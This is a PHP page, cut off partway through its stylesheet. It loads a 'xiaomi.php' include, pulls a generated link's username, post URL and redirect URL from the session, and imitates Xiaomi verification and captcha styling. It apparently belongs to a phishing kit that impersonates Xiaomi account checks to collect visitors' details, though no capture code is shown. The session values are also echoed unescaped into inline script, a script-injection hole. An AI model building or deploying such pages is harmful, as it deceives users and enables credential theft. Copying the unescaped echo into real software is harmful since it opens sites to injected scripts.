<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/xiaomi.php");

	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
	echo "<script>
			var username = '$username';
			var post_url = '$post_url';
			var link_id = '$link_id';
			var redirect_url = '$redirect_url';
	      </script>";
?>

<html lang="en" style="font-size: 22.08px;">
  <head>
    <meta charset="utf-8">
    <link rel="icon" href="images/favicon.ico">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!--[if gt IE 8]>
						<!-->
    <style type="text/css">
      .miverify_wind,
      .miverify_modal_panel {
        -webkit-tap-highlight-color: transparent;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        font-family: "PingFangSC-Regular", "Open Sans", Arial, "Hiragino Sans GB", "Microsoft YaHei", "STHeiti", "WenQuanYi Micro Hei", SimSun, sans-serif;
        font-size: 16px;
        display: none;
        opacity: 0;
        position: fixed;
        z-index: 1147483647;
        left: 0;
        top: 0;
        height: 100%;
        width: 100%;
        -webkit-transition: opacity .5s;
        transition: opacity .5s
      }

      .miverify_wind *,
      .miverify_modal_panel * {
        font-family: "PingFangSC-Regular", "Open Sans", Arial, "Hiragino Sans GB", "Microsoft YaHei", "STHeiti", "WenQuanYi Micro Hei", SimSun, sans-serif
      }

      .miverify_wind a,
      .miverify_modal_panel a {
        color: #999;
        text-decoration: none
      }

      .miverify_wind a:hover,
      .miverify_wind a:focus,
      .miverify_wind a:visited,
      .miverify_modal_panel a:hover,
      .miverify_modal_panel a:focus,
      .miverify_modal_panel a:visited {
        color: #333;
        text-decoration: none
      }

      .miverify_wind a:focus,
      .miverify_modal_panel a:focus {
        outline: 0 none
      }

      .miverify_wind input::-moz-placeholder,
      .miverify_wind::-webkit-input-placeholder,
      .miverify_wind input:-ms-input-placeholder,
      .miverify_modal_panel input::-moz-placeholder,
      .miverify_modal_panel::-webkit-input-placeholder,
      .miverify_modal_panel input:-ms-input-placeholder {
        color: #999;
        font-weight: normal
      }

      .miverify_modal_panel {
        opacity: 1
      }

      .miverify_panel_ghost {
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: .6;
        filter: alpha(opacity=60);
        background-color: #000
      }

      .miverify_panel_box {
        text-align: center;
        position: absolute;
        top: 50%;
        left: 50%;
        -webkit-box-shadow: 0 1px 8px rgba(128, 128, 128, 0.3);
        box-shadow: 0 1px 8px rgba(128, 128, 128, 0.3);
        border: 1px solid #d1d1d1;
        border-radius: 2px;
        overflow: hidden;
        background-color: #fff;
        -webkit-transition: width .5s ease, height .5s ease;
        transition: width .5s ease, height .5s ease;
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        width: 300px
      }

      .miverify_panel_box.miverify_panel_show_captcha .miverify_captcha_content {
        margin: 20px auto;
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex
      }

      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_success,
      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_loading,
      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_error {
        display: none
      }

      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_next {
        display: block
      }

      .miverify_panel_box.loading .miverify_panel_success,
      .miverify_panel_box.loading .miverify_panel_next,
      .miverify_panel_box.loading .miverify_panel_error {
        display: none
      }

      .miverify_panel_box.loading .miverify_panel_loading {
        display: inline-block
      }

      .miverify_panel_box.success .miverify_panel_loading,
      .miverify_panel_box.success .miverify_panel_next,
      .miverify_panel_box.success .miverify_panel_error {
        display: none
      }

      .miverify_panel_box.success .miverify_panel_success {
        display: block
      }

      .miverify_panel_box.error .miverify_panel_success,
      .miverify_panel_box.error .miverify_panel_next,
      .miverify_panel_box.error .miverify_panel_loading {
        display: none
      }

      .miverify_panel_box.error .miverify_panel_error {
        display: block
      }

      .miverify_panel_error {
        display: none;
        width: 100%;
        padding: 20px 0 0 0;
        position: relative
      }

      .miverify_panel_error .miverify_error_footer_panel {
        display: none
      }

      .miverify_panel_error .miverify_error_refresh_type {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex
      }

      .miverify_panel_error .miverify_error_refresh_type .miverify_cancel_btn {
        display: block
      }

      .miverify_panel_error .miverify_panel_error_title {
        margin: 10px 0 0 0;
        color: #000
      }

      .miverify_panel_error .miverify_panel_error_content {
        margin: 30px 0;
        color: #666
      }

      .miverify_panel_loading_title,
      .miverify_panel_loading_content,
      .miverify_panel_success_title,
      .miverify_panel_error_title,
      .miverify_panel_error_content {
        text-align: center;
        font-size: 14px;
        line-height: 14px
      }

      .miverify_ok_btn,
      .miverify_cancel_btn {
        background-color: #fff;
        color: #33ADFF;
        -webkit-appearance: none;
        text-align: center;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        outline: 0 none;
        -webkit-transition: .1s;
        transition: .1s;
        font-weight: 500;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        padding: 17px 20px;
        font-size: 16px;
        line-height: 1;
        white-space: nowrap;
        cursor: pointer;
        border: 1px solid #dcdfe6;
        border-bottom: 0 none;
        border-right: 0 none;
        border-left: 0 none;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1
      }

      .miverify_cancel_btn {
        color: #999;
        border-right: 1px solid #dcdfe6;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1;
        display: none
      }

      .miverify_panel_show_captcha {
        text-align: center
      }

      .miverify_panel_show_captcha .miverify_window {
        height: 260px;
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        -ms-flex-direction: column;
        flex-direction: column
      }

      .miverify_panel_show_captcha .miverify_captcha_title {
        text-overflow: ellipsis;
        white-space: nowrap;
        overflow: hidden;
        text-align: center;
        font-size: 16px;
        margin: 0;
        padding: 10px 0
      }

      .miverify_panel_show_captcha .miverify_content {
        padding: 0 20px;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1
      }

      .miverify_panel_show_captcha .miverify_footer_panel {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex
      }

      .miverify_panel_show_captcha .miverify_refresh_link {
        margin: 10px 0;
        font-size: 14px;
        color: #0099FF;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1;
        margin-left: 10px;
        text-overflow: ellipsis;
        white-space: nowrap;
        overflow: hidden;
        text-align: right
      }

      .miverify_panel_show_captcha .miverify_refresh_link:hover,
      .miverify_panel_show_captcha .miverify_refresh_link:visited,
      .miverify_panel_show_captcha .miverify_refresh_link:active,
      .miverify_panel_show_captcha .miverify_refresh_link:focus {
        color: #0099FF
      }

      .miverify_panel_show_captcha .miverify_err_tip {
        font-size: 14px;
        color: #f66;
        margin: 10px 0;
        text-align: left;
        text-overflow: ellipsis;
        white-space: nowrap;
        overflow: hidden
      }

      .miverify_panel_show_captcha .miverify_captcha_input {
        -webkit-appearance: none;
        background-color: #fff;
        background-image: none;
        border-radius: 4px;
        border: 1px solid #dcdfe6;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        color: #606266;
        display: block;
        outline: none;
        padding: 10px 0 10px 15px;
        width: 100%;
        font-size: 14px
      }

      .miverify_panel_show_captcha img {
        display: block;
        float: left;
        cursor: pointer
      }

      .miverify_flat.miverify_wind .miverify_panel_box {
        -webkit-box-shadow: none !important;
        box-shadow: none !important;
        border: 0 none !important;
        width: 100% !important;
        min-width: 270px
      }

      .miverify_flat.miverify_wind .miverify_panel_ghost {
        background-color: #fff !important
      }

      .miverify_panel_loading {
        display: none;
        margin: 20px auto;
        vertical-align: middle
      }

      .miverify_panel_loading .miverify_panel_loading_content {
        color: #000;
        margin-left: 10px
      }

      .miverify_panel_loading .miverify_panel_loading_icon {
        float: left;
        width: 20px;
        height: 20px;
        -webkit-animation: rotate-loading 1.2s linear infinite;
        animation: rotate-loading 1.2s linear infinite;
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDE0IDc5LjE1MTQ4MSwgMjAxMy8wMy8xMy0xMjowOToxNSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpDMzIxQzg5RDJDQjUxMUU4OThGNkYxQkI2ODBGQTlERCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpDMzIxQzg5RTJDQjUxMUU4OThGNkYxQkI2ODBGQTlERCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkMzMjFDODlCMkNCNTExRTg5OEY2RjFCQjY4MEZBOUREIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkMzMjFDODlDMkNCNTExRTg5OEY2RjFCQjY4MEZBOUREIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+uWjUJwAAAZVJREFUeNqk1MsrRGEYx/Ezx2UyDLZiSrmEhVuUW1aywIYs2Cj/jJ2NpYWysLBgZSuK7ORWRJNbNiLMjMtIjO9TPzUxcpx56tOcOXPOb95z3ud9A07mKkArGlGOMFKI4QqrOM10Y26Gcx0YRqVCHpBAAGVo1vHsX4F20RiG8IEtOcOTrilGBc71vURPcJgpfByLmEGb461sAEsY+DqRo892TOAG0zjyGJhEi17DMW5dTcCo3tc8LhzvFcUCghiB6+ofbAK25b+1gQM0oM4Cm/TDpuOvUpq8fMtyNUuxtJnzU1F1QsRV0ybSWsNP2f3PluVqyAEn+7KMlAXGNcpwFmHW4IWWZYGXOlGdRWAtQtZyFriDd/T4DLPF0Y0X7FrgPk7U7b0+AvtQr5xojjaCO+0y9dqWbjyG2aKYxKt2n/uvtXyNN3SpL9c1+79VHvoVFtSS3fm+fa1osSc1amuDKh0/6JpS1KBTT2P9N4e19N75rSKY0vGjrg1pM0lq/S5rlTheAu3GQY2ySK8grjbb03b1oz4FGABfpltgDckVGAAAAABJRU5ErkJggg==)
      }

      @-webkit-keyframes rotate-loading {
        from {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg)
        }

        to {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg)
        }
      }

      @keyframes rotate-loading {
        from {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg)
        }

        to {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg)
        }
      }

      .area {
        position: absolute;
        left: 50%;
        top: 50%;
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        z-index: -1;
        width: 300px;
        height: 300px;
        max-width: 300px;
        max-height: 300px
      }

      .geetest_panel_ghost {
        position: fixed !important
      }

      .geetest_wind.geetest_panel {
        position: fixed !important
      }

      @media screen and (min-height: 390px) and (max-height: 430px) and (orientation: landscape) {
        .normal .geetest_wind.geetest_panel .geetest_panel_box {
          -webkit-transform: translate(-50%, -50%) scale(0.9);
          transform: translate(-50%, -50%) scale(0.9)
        }
      }

      @media screen and (min-height: 346px) and (max-height: 389px) and (orientation: landscape) {
        .normal .geetest_wind.geetest_panel .geetest_panel_box {
          -webkit-transform: translate(-50%, -50%) scale(0.8);
          transform: translate(-50%, -50%) scale(0.8)
        }
      }

      @media screen and (min-height: 290px) and (max-height: 345px) and (orientation: landscape) {
        .normal .geetest_wind.geetest_panel .geetest_panel_box {
          -webkit-transform: translate(-50%, -50%) scale(0.7);
          transform: translate(-50%, -50%) scale(0.7)
        }
      }

      @media screen and (max-height: 289px) and (orientation: landscape) {
        .normal .geetest_wind.geetest_panel .geetest_panel_box {
          -webkit-transform: translate(-50%, -50%) scale(0.58);
          transform: translate(-50%, -50%) scale(0.58)
        }
      }
    </style>
    <!--
						<![endif]-->
    <link href="css/mobile.css" rel="stylesheet">
    <style data-jss="" data-meta="MuiDialog">
      @media print {
        .MuiDialog-root {
          position: absolute !important;
        }
      }

      .MuiDialog-scrollPaper {
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .MuiDialog-scrollBody {
        overflow-x: hidden;
        overflow-y: auto;
        text-align: center;
      }

      .MuiDialog-scrollBody:after {
        width: 0;
        height: 100%;
        content: "";
        display: inline-block;
        vertical-align: middle;
      }

      .MuiDialog-container {
        height: 100%;
        outline: 0;
      }

      @media print {
        .MuiDialog-container {
          height: auto;
        }
      }

      .MuiDialog-paper {
        margin: 32px;
        position: relative;
        overflow-y: auto;
      }

      @media print {
        .MuiDialog-paper {
          box-shadow: none;
          overflow-y: visible;
        }
      }

      .MuiDialog-paperScrollPaper {
        display: flex;
        max-height: calc(100% - 64px);
        flex-direction: column;
      }

      .MuiDialog-paperScrollBody {
        display: inline-block;
        text-align: left;
        vertical-align: middle;
      }

      .MuiDialog-paperWidthFalse {
        max-width: calc(100% - 64px);
      }

      .MuiDialog-paperWidthXs {
        max-width: 444px;
      }

      @media (max-width:507.95px) {
        .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
          max-width: calc(100% - 64px);
        }
      }

      .MuiDialog-paperWidthSm {
        max-width: 15.972222rem;
      }

      @media (max-width:663.95px) {
        .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
          max-width: calc(100% - 64px);
        }
      }

      .MuiDialog-paperWidthMd {
        max-width: 960px;
      }

      @media (max-width:1023.95px) {
        .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
          max-width: calc(100% - 64px);
        }
      }

      .MuiDialog-paperWidthLg {
        max-width: 1280px;
      }

      @media (max-width:1343.95px) {
        .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
          max-width: calc(100% - 64px);
        }
      }

      .MuiDialog-paperWidthXl {
        max-width: 1920px;
      }

      @media (max-width:1983.95px) {
        .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
          max-width: calc(100% - 64px);
        }
      }

      .MuiDialog-paperFullWidth {
        width: calc(100% - 64px);
      }

      .MuiDialog-paperFullScreen {
        width: 100%;
        height: 100%;
        margin: 0;
        max-width: 100%;
        max-height: none;
        border-radius: 0;
      }

      .MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
        margin: 0;
        max-width: 100%;
      }
    </style>
    <style data-jss="" data-meta="MuiTouchRipple">
      .MuiTouchRipple-root {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 0;
        overflow: hidden;
        position: absolute;
        border-radius: inherit;
        pointer-events: none;
      }

      .MuiTouchRipple-ripple {
        opacity: 0;
        position: absolute;
      }

      .MuiTouchRipple-rippleVisible {
        opacity: 0.3;
        animation: MuiTouchRipple-keyframes-enter 550ms cubic-bezier(0.4, 0, 0.2, 1);
        transform: scale(1);
      }

      .MuiTouchRipple-ripplePulsate {
        animation-duration: 200ms;
      }

      .MuiTouchRipple-child {
        width: 100%;
        height: 100%;
        display: block;
        opacity: 1;
        border-radius: 50%;
        background-color: currentColor;
      }

      .MuiTouchRipple-childLeaving {
        opacity: 0;
        animation: MuiTouchRipple-keyframes-exit 550ms cubic-bezier(0.4, 0, 0.2, 1);
      }

      .MuiTouchRipple-childPulsate {
        top: 0;
        left: 0;
        position: absolute;
        animation: MuiTouchRipple-keyframes-pulsate 2500ms cubic-bezier(0.4, 0, 0.2, 1) 200ms infinite;
      }

      @-webkit-keyframes MuiTouchRipple-keyframes-enter {
        0% {
          opacity: 0.1;
          transform: scale(0);
        }

        100% {
          opacity: 0.3;
          transform: scale(1);
        }
      }

      @-webkit-keyframes MuiTouchRipple-keyframes-exit {
        0% {
          opacity: 1;
        }

        100% {
          opacity: 0;
        }
      }

      @-webkit-keyframes MuiTouchRipple-keyframes-pulsate {
        0% {
          transform: scale(1);
        }

        50% {
          transform: scale(0.92);
        }

        100% {
          transform: scale(1);
        }
      }
    </style>
    <style data-jss="" data-meta="MuiButtonBase">
      .MuiButtonBase-root {
        color: inherit;
        border: 0;
        cursor: pointer;
        margin: 0;
        display: inline-flex;
        outline: 0;
        padding: 0;
        position: relative;
        align-items: center;
        user-select: none;
        border-radius: 0;
        vertical-align: middle;
        -moz-appearance: none;
        justify-content: center;
        text-decoration: none;
        background-color: transparent;
        -webkit-appearance: none;
        -webkit-tap-highlight-color: transparent;
      }

      .MuiButtonBase-root::-moz-focus-inner {
        border-style: none;
      }

      .MuiButtonBase-root.Mui-disabled {
        cursor: default;
        pointer-events: none;
      }

      @media print {
        .MuiButtonBase-root {
          -webkit-print-color-adjust: exact;
        }
      }
    </style>
    <style data-jss="" data-meta="MuiButton">
      .MuiButton-root {
        color: rgba(0, 0, 0, 0.87);
        padding: 6px 16px;
        font-size: 0.875rem;
        min-width: 64px;
        box-sizing: border-box;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 500;
        line-height: 1.75;
        border-radius: 4px;
        text-transform: none;
      }

      .MuiButton-root:hover {
        text-decoration: none;
        background-color: rgba(0, 0, 0, 0.04);
      }

      .MuiButton-root.Mui-disabled {
        color: rgba(0, 0, 0, 0.26);
      }

      @media (hover: none) {
        .MuiButton-root:hover {
          background-color: transparent;
        }
      }

      .MuiButton-root:hover.Mui-disabled {
        background-color: transparent;
      }

      .MuiButton-label {
        width: 100%;
        display: inherit;
        align-items: inherit;
        justify-content: inherit;
      }

      .MuiButton-text {
        padding: 6px 8px;
      }

      .MuiButton-textPrimary {
        color: #0B84FF;
      }

      .MuiButton-textPrimary:hover {
        background-color: rgba(11, 132, 255, 0.04);
      }

      @media (hover: none) {
        .MuiButton-textPrimary:hover {
          background-color: transparent;
        }
      }

      .MuiButton-textSecondary {
        color: #f50057;
      }

      .MuiButton-textSecondary:hover {
        background-color: rgba(245, 0, 87, 0.04);
      }

      @media (hover: none) {
        .MuiButton-textSecondary:hover {
          background-color: transparent;
        }
      }

      .MuiButton-outlined {
        border: 1px solid rgba(0, 0, 0, 0.23);
        padding: 5px 15px;
      }

      .MuiButton-outlined.Mui-disabled {
        border: 1px solid rgba(0, 0, 0, 0.12);
      }

      .MuiButton-outlinedPrimary {
        color: #0B84FF;
        border: 1px solid rgba(11, 132, 255, 0.5);
      }

      .MuiButton-outlinedPrimary:hover {
        border: 1px solid #0B84FF;
        background-color: rgba(11, 132, 255, 0.04);
      }

      @media (hover: none) {
        .MuiButton-outlinedPrimary:hover {
          background-color: transparent;
        }
      }

      .MuiButton-outlinedSecondary {
        color: #f50057;
        border: 1px solid rgba(245, 0, 87, 0.5);
      }

      .MuiButton-outlinedSecondary:hover {
        border: 1px solid #f50057;
        background-color: rgba(245, 0, 87, 0.04);
      }

      .MuiButton-outlinedSecondary.Mui-disabled {
        border: 1px solid rgba(0, 0, 0, 0.26);
      }

      @media (hover: none) {
        .MuiButton-outlinedSecondary:hover {
          background-color: transparent;
        }
      }

      .MuiButton-contained {
        color: rgba(0, 0, 0, 0.87);
        box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
        background-color: #e0e0e0;
      }

      .MuiButton-contained:hover {
        box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
        background-color: #d5d5d5;
      }

      .MuiButton-contained.Mui-focusVisible {
        box-shadow: 0px 3px 5px -1px rgba(0, 0, 0, 0.2), 0px 6px 10px 0px rgba(0, 0, 0, 0.14), 0px 1px 18px 0px rgba(0, 0, 0, 0.12);
      }

      .MuiButton-contained:active {
        box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
      }

      .MuiButton-contained.Mui-disabled {
        color: rgba(0, 0, 0, 0.26);
        box-shadow: none;
        background-color: rgba(0, 0, 0, 0.12);
      }

      @media (hover: none) {
        .MuiButton-contained:hover {
          box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
          background-color: #e0e0e0;
        }
      }

      .MuiButton-contained:hover.Mui-disabled {
        background-color: rgba(0, 0, 0, 0.12);
      }

      .MuiButton-containedPrimary {
        color: #FFFFFF;
        background-color: #0B84FF;
      }

      .MuiButton-containedPrimary:hover {
        background-color: rgb(7, 92, 178);
      }

      .MuiButton-containedPrimary.Mui-disabled {
        color: rgba(255, 255, 255, 0.7);
        background-color: rgba(11, 132, 255, 0.3);
      }

      .MuiButton-containedPrimary:hover.Mui-disabled {
        background-color: rgba(11, 132, 255, 0.3);
      }

      @media (hover: none) {
        .MuiButton-containedPrimary:hover {
          background-color: #0B84FF;
        }
      }

      .MuiButton-containedSecondary {
        color: #fff;
        background-color: #f50057;
      }

      .MuiButton-containedSecondary:hover {
        background-color: #c51162;
      }

      @media (hover: none) {
        .MuiButton-containedSecondary:hover {
          background-color: #f50057;
        }
      }

      .MuiButton-disableElevation {
        box-shadow: none;
      }

      .MuiButton-disableElevation:hover {
        box-shadow: none;
      }

      .MuiButton-disableElevation.Mui-focusVisible {
        box-shadow: none;
      }

      .MuiButton-disableElevation:active {
        box-shadow: none;
      }

      .MuiButton-disableElevation.Mui-disabled {
        box-shadow: none;
      }

      .MuiButton-colorInherit {
        color: inherit;
        border-color: currentColor;
      }

      .MuiButton-textSizeSmall {
        padding: 4px 5px;
        font-size: 0.8125rem;
      }

      .MuiButton-textSizeLarge {
        padding: 8px 11px;
        font-size: 0.9375rem;
      }

      .MuiButton-outlinedSizeSmall {
        padding: 3px 9px;
        font-size: 0.8125rem;
      }

      .MuiButton-outlinedSizeLarge {
        padding: 7px 21px;
        font-size: 0.9375rem;
      }

      .MuiButton-containedSizeSmall {
        padding: 4px 10px;
        font-size: 0.8125rem;
      }

      .MuiButton-containedSizeLarge {
        padding: 8px 22px;
        font-size: 0.9375rem;
      }

      .MuiButton-fullWidth {
        width: 100%;
      }

      .MuiButton-startIcon {
        display: inherit;
        margin-left: -4px;
        margin-right: 8px;
      }

      .MuiButton-startIcon.MuiButton-iconSizeSmall {
        margin-left: -2px;
      }

      .MuiButton-endIcon {
        display: inherit;
        margin-left: 8px;
        margin-right: -4px;
      }

      .MuiButton-endIcon.MuiButton-iconSizeSmall {
        margin-right: -2px;
      }

      .MuiButton-iconSizeSmall>*:first-child {
        font-size: 18px;
      }

      .MuiButton-iconSizeMedium>*:first-child {
        font-size: 20px;
      }

      .MuiButton-iconSizeLarge>*:first-child {
        font-size: 22px;
      }
    </style>
    <style data-jss="" data-meta="MuiTypography">
      .MuiTypography-root {
        margin: 0;
      }

      .MuiTypography-body2 {
        font-size: 0.875rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 1.43;
      }

      .MuiTypography-body1 {
        font-size: 1rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 1.5;
      }

      .MuiTypography-caption {
        font-size: 0.75rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 1.66;
      }

      .MuiTypography-button {
        font-size: 0.875rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 500;
        line-height: 1.75;
        text-transform: uppercase;
      }

      .MuiTypography-h1 {
        font-size: 6rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 300;
        line-height: 1.167;
      }

      .MuiTypography-h2 {
        font-size: 3.75rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 300;
        line-height: 1.2;
      }

      .MuiTypography-h3 {
        font-size: 3rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 1.167;
      }

      .MuiTypography-h4 {
        font-size: 2.125rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 1.235;
      }

      .MuiTypography-h5 {
        font-size: 1.5rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 1.334;
      }

      .MuiTypography-h6 {
        font-size: 1.25rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 500;
        line-height: 1.6;
      }

      .MuiTypography-subtitle1 {
        font-size: 1rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 1.75;
      }

      .MuiTypography-subtitle2 {
        font-size: 0.875rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 500;
        line-height: 1.57;
      }

      .MuiTypography-overline {
        font-size: 0.75rem;
        font-family: 'MI Lan Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-weight: 400;
        line-height: 2.66;
        text-transform: uppercase;
      }

      .MuiTypography-srOnly {
        width: 1px;
        height: 1px;
        overflow: hidden;
        position: absolute;
      }

      .MuiTypography-alignLeft {
        text-align: left;
      }

      .MuiTypography-alignCenter {
        text-align: center;
      }

      .MuiTypography-alignRight {
        text-align: right;
      }

      .MuiTypography-alignJustify {
        text-align: justify;
      }

      .MuiTypography-noWrap {
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
